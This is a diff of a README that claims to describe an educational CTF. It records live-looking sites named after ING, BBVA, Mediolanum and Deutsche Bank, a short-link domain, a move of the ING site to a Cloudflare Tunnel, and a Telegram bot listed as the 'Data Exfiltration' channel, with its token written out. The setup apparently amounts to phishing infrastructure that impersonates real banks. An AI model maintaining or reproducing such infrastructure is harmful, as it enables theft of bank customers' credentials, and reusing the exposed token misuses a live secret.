@@ -4,14 +4,14 @@ This repository contains the configuration and state for a CTF focused on educat
 
 ## Current State (as of 2026-05-08)
 
-### Active Sites (Vercel)
-- **ING**: [https://banca.short.gy](https://banca.short.gy) (Root domain, new destination)
+### Active Sites (Cloudflare Tunnel)
+- **ING**: [https://banca.short.gy](https://banca.short.gy) (Cloudflare Tunnel)
 - **BBVA**: [vercel-bbva.vercel.app](https://vercel-bbva.vercel.app)
 - **Mediolanum**: [vercel-mediolanum.vercel.app](https://vercel-mediolanum.vercel.app)
 - **Deutsche Bank**: [vercel-deutschebank.vercel.app](https://vercel-deutschebank.vercel.app)
 
 ### Infrastructure Components
-- **Hosting**: Vercel
+- **Hosting**: Local Server + Cloudflare Tunnel (for ING)
 - **Link Management**: Short.io (Domain: banca.short.gy)
 - **Data Exfiltration**: Telegram Bot (`8658543489:AAHTAbGfWiw83B-FJ83bDapipV7SYh58M14`)
 - **Tunnels**: Cloudflare (used for local development/testing)
